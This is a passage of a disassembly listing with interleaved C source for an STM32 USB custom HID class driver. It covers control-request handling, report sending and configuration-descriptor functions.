 800884a:	d056      	beq.n	80088fa <USBD_CUSTOM_HID_Setup+0xee>
 800884c:	2b20      	cmp	r3, #32
 800884e:	f040 80e8 	bne.w	8008a22 <USBD_CUSTOM_HID_Setup+0x216>
  {
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008852:	683b      	ldr	r3, [r7, #0]
 8008854:	785b      	ldrb	r3, [r3, #1]
 8008856:	3b02      	subs	r3, #2
 8008858:	2b09      	cmp	r3, #9
 800885a:	d846      	bhi.n	80088ea <USBD_CUSTOM_HID_Setup+0xde>
 800885c:	a201      	add	r2, pc, #4	; (adr r2, 8008864 <USBD_CUSTOM_HID_Setup+0x58>)
 800885e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8008862:	bf00      	nop
 8008864:	080088bd 	.word	0x080088bd
 8008868:	0800889b 	.word	0x0800889b
 800886c:	080088eb 	.word	0x080088eb
 8008870:	080088eb 	.word	0x080088eb
 8008874:	080088eb 	.word	0x080088eb
 8008878:	080088eb 	.word	0x080088eb
 800887c:	080088eb 	.word	0x080088eb
 8008880:	080088cd 	.word	0x080088cd
 8008884:	080088ab 	.word	0x080088ab
 8008888:	0800888d 	.word	0x0800888d
      {
        case CUSTOM_HID_REQ_SET_PROTOCOL:
          hhid->Protocol = (uint8_t)(req->wValue);
 800888c:	683b      	ldr	r3, [r7, #0]
 800888e:	885b      	ldrh	r3, [r3, #2]
 8008890:	b2db      	uxtb	r3, r3
 8008892:	461a      	mov	r2, r3
 8008894:	693b      	ldr	r3, [r7, #16]
 8008896:	611a      	str	r2, [r3, #16]
          break;
 8008898:	e02e      	b.n	80088f8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_PROTOCOL:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->Protocol, 1U);
 800889a:	693b      	ldr	r3, [r7, #16]
 800889c:	3310      	adds	r3, #16
 800889e:	2201      	movs	r2, #1
 80088a0:	4619      	mov	r1, r3
 80088a2:	6878      	ldr	r0, [r7, #4]
 80088a4:	f003 fd0e 	bl	800c2c4 <USBD_CtlSendData>
          break;
 80088a8:	e026      	b.n	80088f8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_SET_IDLE:
          hhid->IdleState = (uint8_t)(req->wValue >> 8);
 80088aa:	683b      	ldr	r3, [r7, #0]
 80088ac:	885b      	ldrh	r3, [r3, #2]
 80088ae:	0a1b      	lsrs	r3, r3, #8
 80088b0:	b29b      	uxth	r3, r3
 80088b2:	b2db      	uxtb	r3, r3
 80088b4:	461a      	mov	r2, r3
 80088b6:	693b      	ldr	r3, [r7, #16]
 80088b8:	615a      	str	r2, [r3, #20]
          break;
 80088ba:	e01d      	b.n	80088f8 <USBD_CUSTOM_HID_Setup+0xec>

        case CUSTOM_HID_REQ_GET_IDLE:
          (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->IdleState, 1U);
 80088bc:	693b      	ldr	r3, [r7, #16]
 80088be:	3314      	adds	r3, #20
 80088c0:	2201      	movs	r2, #1
 80088c2:	4619      	mov	r1, r3
 80088c4:	6878      	ldr	r0, [r7, #4]
 80088c6:	f003 fcfd 	bl	800c2c4 <USBD_CtlSendData>
          break;
 80088ca:	e015      	b.n	80088f8 <USBD_CUSTOM_HID_Setup+0xec>
            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 80088cc:	693b      	ldr	r3, [r7, #16]
 80088ce:	2201      	movs	r2, #1
 80088d0:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80088d2:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 80088d4:	683b      	ldr	r3, [r7, #0]
 80088d6:	88db      	ldrh	r3, [r3, #6]
 80088d8:	2b0f      	cmp	r3, #15
 80088da:	bf28      	it	cs
 80088dc:	230f      	movcs	r3, #15
 80088de:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 80088e0:	461a      	mov	r2, r3
 80088e2:	6878      	ldr	r0, [r7, #4]
 80088e4:	f003 fd1a 	bl	800c31c <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 80088e8:	e006      	b.n	80088f8 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 80088ea:	6839      	ldr	r1, [r7, #0]
 80088ec:	6878      	ldr	r0, [r7, #4]
 80088ee:	f003 fc78 	bl	800c1e2 <USBD_CtlError>
          ret = USBD_FAIL;
 80088f2:	2303      	movs	r3, #3
 80088f4:	75fb      	strb	r3, [r7, #23]
          break;
 80088f6:	bf00      	nop
      }
      break;
 80088f8:	e09a      	b.n	8008a30 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 80088fa:	683b      	ldr	r3, [r7, #0]
 80088fc:	785b      	ldrb	r3, [r3, #1]
 80088fe:	2b0b      	cmp	r3, #11
 8008900:	f200 8086 	bhi.w	8008a10 <USBD_CUSTOM_HID_Setup+0x204>
 8008904:	a201      	add	r2, pc, #4	; (adr r2, 800890c <USBD_CUSTOM_HID_Setup+0x100>)
 8008906:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800890a:	bf00      	nop
 800890c:	0800893d 	.word	0x0800893d
 8008910:	08008a1f 	.word	0x08008a1f
 8008914:	08008a11 	.word	0x08008a11
 8008918:	08008a11 	.word	0x08008a11
 800891c:	08008a11 	.word	0x08008a11
 8008920:	08008a11 	.word	0x08008a11
 8008924:	08008967 	.word	0x08008967
 8008928:	08008a11 	.word	0x08008a11
 800892c:	08008a11 	.word	0x08008a11
 8008930:	08008a11 	.word	0x08008a11
 8008934:	080089bf 	.word	0x080089bf
 8008938:	080089e9 	.word	0x080089e9
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800893c:	687b      	ldr	r3, [r7, #4]
 800893e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008942:	b2db      	uxtb	r3, r3
 8008944:	2b03      	cmp	r3, #3
 8008946:	d107      	bne.n	8008958 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 8008948:	f107 030e 	add.w	r3, r7, #14
 800894c:	2202      	movs	r2, #2
 800894e:	4619      	mov	r1, r3
 8008950:	6878      	ldr	r0, [r7, #4]
 8008952:	f003 fcb7 	bl	800c2c4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008956:	e063      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008958:	6839      	ldr	r1, [r7, #0]
 800895a:	6878      	ldr	r0, [r7, #4]
 800895c:	f003 fc41 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008960:	2303      	movs	r3, #3
 8008962:	75fb      	strb	r3, [r7, #23]
          break;
 8008964:	e05c      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 8008966:	683b      	ldr	r3, [r7, #0]
 8008968:	885b      	ldrh	r3, [r3, #2]
 800896a:	0a1b      	lsrs	r3, r3, #8
 800896c:	b29b      	uxth	r3, r3
 800896e:	2b22      	cmp	r3, #34	; 0x22
 8008970:	d110      	bne.n	8008994 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 8008972:	683b      	ldr	r3, [r7, #0]
 8008974:	88db      	ldrh	r3, [r3, #6]
 8008976:	2b49      	cmp	r3, #73	; 0x49
 8008978:	bf28      	it	cs
 800897a:	2349      	movcs	r3, #73	; 0x49
 800897c:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 800897e:	687b      	ldr	r3, [r7, #4]
 8008980:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008984:	687a      	ldr	r2, [r7, #4]
 8008986:	33b0      	adds	r3, #176	; 0xb0
 8008988:	009b      	lsls	r3, r3, #2
 800898a:	4413      	add	r3, r2
 800898c:	685b      	ldr	r3, [r3, #4]
 800898e:	681b      	ldr	r3, [r3, #0]
 8008990:	61bb      	str	r3, [r7, #24]
 8008992:	e00d      	b.n	80089b0 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008994:	683b      	ldr	r3, [r7, #0]
 8008996:	885b      	ldrh	r3, [r3, #2]
 8008998:	0a1b      	lsrs	r3, r3, #8
 800899a:	b29b      	uxth	r3, r3
 800899c:	2b21      	cmp	r3, #33	; 0x21
 800899e:	d107      	bne.n	80089b0 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 80089a0:	4b26      	ldr	r3, [pc, #152]	; (8008a3c <USBD_CUSTOM_HID_Setup+0x230>)
 80089a2:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 80089a4:	683b      	ldr	r3, [r7, #0]
 80089a6:	88db      	ldrh	r3, [r3, #6]
 80089a8:	2b09      	cmp	r3, #9
 80089aa:	bf28      	it	cs
 80089ac:	2309      	movcs	r3, #9
 80089ae:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 80089b0:	8bfb      	ldrh	r3, [r7, #30]
 80089b2:	461a      	mov	r2, r3
 80089b4:	69b9      	ldr	r1, [r7, #24]
 80089b6:	6878      	ldr	r0, [r7, #4]
 80089b8:	f003 fc84 	bl	800c2c4 <USBD_CtlSendData>
          break;
 80089bc:	e030      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089be:	687b      	ldr	r3, [r7, #4]
 80089c0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089c4:	b2db      	uxtb	r3, r3
 80089c6:	2b03      	cmp	r3, #3
 80089c8:	d107      	bne.n	80089da <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 80089ca:	693b      	ldr	r3, [r7, #16]
 80089cc:	3318      	adds	r3, #24
 80089ce:	2201      	movs	r2, #1
 80089d0:	4619      	mov	r1, r3
 80089d2:	6878      	ldr	r0, [r7, #4]
 80089d4:	f003 fc76 	bl	800c2c4 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80089d8:	e022      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80089da:	6839      	ldr	r1, [r7, #0]
 80089dc:	6878      	ldr	r0, [r7, #4]
 80089de:	f003 fc00 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 80089e2:	2303      	movs	r3, #3
 80089e4:	75fb      	strb	r3, [r7, #23]
          break;
 80089e6:	e01b      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089e8:	687b      	ldr	r3, [r7, #4]
 80089ea:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089ee:	b2db      	uxtb	r3, r3
 80089f0:	2b03      	cmp	r3, #3
 80089f2:	d106      	bne.n	8008a02 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 80089f4:	683b      	ldr	r3, [r7, #0]
 80089f6:	885b      	ldrh	r3, [r3, #2]
 80089f8:	b2db      	uxtb	r3, r3
 80089fa:	461a      	mov	r2, r3
 80089fc:	693b      	ldr	r3, [r7, #16]
 80089fe:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008a00:	e00e      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008a02:	6839      	ldr	r1, [r7, #0]
 8008a04:	6878      	ldr	r0, [r7, #4]
 8008a06:	f003 fbec 	bl	800c1e2 <USBD_CtlError>
            ret = USBD_FAIL;
 8008a0a:	2303      	movs	r3, #3
 8008a0c:	75fb      	strb	r3, [r7, #23]
          break;
 8008a0e:	e007      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008a10:	6839      	ldr	r1, [r7, #0]
 8008a12:	6878      	ldr	r0, [r7, #4]
 8008a14:	f003 fbe5 	bl	800c1e2 <USBD_CtlError>
          ret = USBD_FAIL;
 8008a18:	2303      	movs	r3, #3
 8008a1a:	75fb      	strb	r3, [r7, #23]
          break;
 8008a1c:	e000      	b.n	8008a20 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 8008a1e:	bf00      	nop
      }
      break;
 8008a20:	e006      	b.n	8008a30 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 8008a22:	6839      	ldr	r1, [r7, #0]
 8008a24:	6878      	ldr	r0, [r7, #4]
 8008a26:	f003 fbdc 	bl	800c1e2 <USBD_CtlError>
      ret = USBD_FAIL;
 8008a2a:	2303      	movs	r3, #3
 8008a2c:	75fb      	strb	r3, [r7, #23]
      break;
 8008a2e:	bf00      	nop
  }
  return (uint8_t)ret;
 8008a30:	7dfb      	ldrb	r3, [r7, #23]
}
 8008a32:	4618      	mov	r0, r3
 8008a34:	3720      	adds	r7, #32
 8008a36:	46bd      	mov	sp, r7
 8008a38:	bd80      	pop	{r7, pc}
 8008a3a:	bf00      	nop
 8008a3c:	20000090 	.word	0x20000090

08008a40 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 8008a40:	b580      	push	{r7, lr}
 8008a42:	b086      	sub	sp, #24
 8008a44:	af00      	add	r7, sp, #0
 8008a46:	60f8      	str	r0, [r7, #12]
 8008a48:	60b9      	str	r1, [r7, #8]
 8008a4a:	4613      	mov	r3, r2
 8008a4c:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008a4e:	68fb      	ldr	r3, [r7, #12]
 8008a50:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008a54:	68fb      	ldr	r3, [r7, #12]
 8008a56:	32b0      	adds	r2, #176	; 0xb0
 8008a58:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008a5c:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 8008a5e:	697b      	ldr	r3, [r7, #20]
 8008a60:	2b00      	cmp	r3, #0
 8008a62:	d101      	bne.n	8008a68 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 8008a64:	2303      	movs	r3, #3
 8008a66:	e019      	b.n	8008a9c <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008a68:	68fb      	ldr	r3, [r7, #12]
 8008a6a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008a6e:	b2db      	uxtb	r3, r3
 8008a70:	2b03      	cmp	r3, #3
 8008a72:	d112      	bne.n	8008a9a <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 8008a74:	697b      	ldr	r3, [r7, #20]
 8008a76:	f893 3020 	ldrb.w	r3, [r3, #32]
 8008a7a:	2b00      	cmp	r3, #0
 8008a7c:	d10b      	bne.n	8008a96 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 8008a7e:	697b      	ldr	r3, [r7, #20]
 8008a80:	2201      	movs	r2, #1
 8008a82:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008a86:	4b07      	ldr	r3, [pc, #28]	; (8008aa4 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008a88:	7819      	ldrb	r1, [r3, #0]
 8008a8a:	88fb      	ldrh	r3, [r7, #6]
 8008a8c:	68ba      	ldr	r2, [r7, #8]
 8008a8e:	68f8      	ldr	r0, [r7, #12]
 8008a90:	f004 f9ea 	bl	800ce68 <USBD_LL_Transmit>
 8008a94:	e001      	b.n	8008a9a <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a96:	2301      	movs	r3, #1
 8008a98:	e000      	b.n	8008a9c <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a9a:	2300      	movs	r3, #0
}
 8008a9c:	4618      	mov	r0, r3
 8008a9e:	3718      	adds	r7, #24
 8008aa0:	46bd      	mov	sp, r7
 8008aa2:	bd80      	pop	{r7, pc}
 8008aa4:	200000a6 	.word	0x200000a6

08008aa8 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008aa8:	b580      	push	{r7, lr}
 8008aaa:	b084      	sub	sp, #16
 8008aac:	af00      	add	r7, sp, #0
 8008aae:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008ab0:	2181      	movs	r1, #129	; 0x81
 8008ab2:	4815      	ldr	r0, [pc, #84]	; (8008b08 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008ab4:	f002 fd32 	bl	800b51c <USBD_GetEpDesc>
 8008ab8:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008aba:	2101      	movs	r1, #1
 8008abc:	4812      	ldr	r0, [pc, #72]	; (8008b08 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008abe:	f002 fd2d 	bl	800b51c <USBD_GetEpDesc>
 8008ac2:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008ac4:	68fb      	ldr	r3, [r7, #12]
 8008ac6:	2b00      	cmp	r3, #0
 8008ac8:	d009      	beq.n	8008ade <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008aca:	68fb      	ldr	r3, [r7, #12]
 8008acc:	2200      	movs	r2, #0
 8008ace:	f042 0202 	orr.w	r2, r2, #2
 8008ad2:	711a      	strb	r2, [r3, #4]
 8008ad4:	2200      	movs	r2, #0
 8008ad6:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008ad8:	68fb      	ldr	r3, [r7, #12]
 8008ada:	2205      	movs	r2, #5
 8008adc:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ade:	68bb      	ldr	r3, [r7, #8]
 8008ae0:	2b00      	cmp	r3, #0
 8008ae2:	d009      	beq.n	8008af8 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ae4:	68bb      	ldr	r3, [r7, #8]
 8008ae6:	2200      	movs	r2, #0
 8008ae8:	f042 0202 	orr.w	r2, r2, #2
 8008aec:	711a      	strb	r2, [r3, #4]
 8008aee:	2200      	movs	r2, #0
 8008af0:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008af2:	68bb      	ldr	r3, [r7, #8]
 8008af4:	2205      	movs	r2, #5
 8008af6:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008af8:	687b      	ldr	r3, [r7, #4]
 8008afa:	2229      	movs	r2, #41	; 0x29
 8008afc:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008afe:	4b02      	ldr	r3, [pc, #8]	; (8008b08 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008b00:	4618      	mov	r0, r3
 8008b02:	3710      	adds	r7, #16
 8008b04:	46bd      	mov	sp, r7
 8008b06:	bd80      	pop	{r7, pc}
 8008b08:	20000064 	.word	0x20000064

08008b0c <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008b0c:	b580      	push	{r7, lr}
 8008b0e:	b084      	sub	sp, #16
 8008b10:	af00      	add	r7, sp, #0
 8008b12:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b14:	2181      	movs	r1, #129	; 0x81
 8008b16:	4815      	ldr	r0, [pc, #84]	; (8008b6c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008b18:	f002 fd00 	bl	800b51c <USBD_GetEpDesc>
 8008b1c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b1e:	2101      	movs	r1, #1
 8008b20:	4812      	ldr	r0, [pc, #72]	; (8008b6c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008b22:	f002 fcfb 	bl	800b51c <USBD_GetEpDesc>
 8008b26:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b28:	68fb      	ldr	r3, [r7, #12]
 8008b2a:	2b00      	cmp	r3, #0
 8008b2c:	d009      	beq.n	8008b42 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b2e:	68fb      	ldr	r3, [r7, #12]
 8008b30:	2200      	movs	r2, #0
 8008b32:	f042 0202 	orr.w	r2, r2, #2
 8008b36:	711a      	strb	r2, [r3, #4]
 8008b38:	2200      	movs	r2, #0
 8008b3a:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008b3c:	68fb      	ldr	r3, [r7, #12]
 8008b3e:	2205      	movs	r2, #5
 8008b40:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b42:	68bb      	ldr	r3, [r7, #8]
 8008b44:	2b00      	cmp	r3, #0
 8008b46:	d009      	beq.n	8008b5c <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b48:	68bb      	ldr	r3, [r7, #8]
 8008b4a:	2200      	movs	r2, #0
 8008b4c:	f042 0202 	orr.w	r2, r2, #2
 8008b50:	711a      	strb	r2, [r3, #4]
 8008b52:	2200      	movs	r2, #0
 8008b54:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008b56:	68bb      	ldr	r3, [r7, #8]
 8008b58:	2205      	movs	r2, #5
 8008b5a:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b5c:	687b      	ldr	r3, [r7, #4]
 8008b5e:	2229      	movs	r2, #41	; 0x29
 8008b60:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b62:	4b02      	ldr	r3, [pc, #8]	; (8008b6c <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008b64:	4618      	mov	r0, r3
 8008b66:	3710      	adds	r7, #16
 8008b68:	46bd      	mov	sp, r7
 8008b6a:	bd80      	pop	{r7, pc}
 8008b6c:	20000064 	.word	0x20000064

08008b70 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008b70:	b580      	push	{r7, lr}
 8008b72:	b084      	sub	sp, #16
 8008b74:	af00      	add	r7, sp, #0
 8008b76:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008b78:	2181      	movs	r1, #129	; 0x81
 8008b7a:	4815      	ldr	r0, [pc, #84]	; (8008bd0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b7c:	f002 fcce 	bl	800b51c <USBD_GetEpDesc>
 8008b80:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b82:	2101      	movs	r1, #1
 8008b84:	4812      	ldr	r0, [pc, #72]	; (8008bd0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b86:	f002 fcc9 	bl	800b51c <USBD_GetEpDesc>
 8008b8a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b8c:	68fb      	ldr	r3, [r7, #12]
 8008b8e:	2b00      	cmp	r3, #0
 8008b90:	d009      	beq.n	8008ba6 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b92:	68fb      	ldr	r3, [r7, #12]
 8008b94:	2200      	movs	r2, #0
 8008b96:	f042 0202 	orr.w	r2, r2, #2
 8008b9a:	711a      	strb	r2, [r3, #4]
 8008b9c:	2200      	movs	r2, #0
 8008b9e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008ba0:	68fb      	ldr	r3, [r7, #12]
 8008ba2:	2205      	movs	r2, #5
 8008ba4:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ba6:	68bb      	ldr	r3, [r7, #8]
 8008ba8:	2b00      	cmp	r3, #0
 8008baa:	d009      	beq.n	8008bc0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008bac:	68bb      	ldr	r3, [r7, #8]
 8008bae:	2200      	movs	r2, #0
 8008bb0:	f042 0202 	orr.w	r2, r2, #2
 8008bb4:	711a      	strb	r2, [r3, #4]
 8008bb6:	2200      	movs	r2, #0
 8008bb8:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008bba:	68bb      	ldr	r3, [r7, #8]
 8008bbc:	2205      	movs	r2, #5
 8008bbe:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008bc0:	687b      	ldr	r3, [r7, #4]
 8008bc2:	2229      	movs	r2, #41	; 0x29
 8008bc4:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008bc6:	4b02      	ldr	r3, [pc, #8]	; (8008bd0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008bc8:	4618      	mov	r0, r3
 8008bca:	3710      	adds	r7, #16
 8008bcc:	46bd      	mov	sp, r7
 8008bce:	bd80      	pop	{r7, pc}
 8008bd0:	20000064 	.word	0x20000064

08008bd4 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
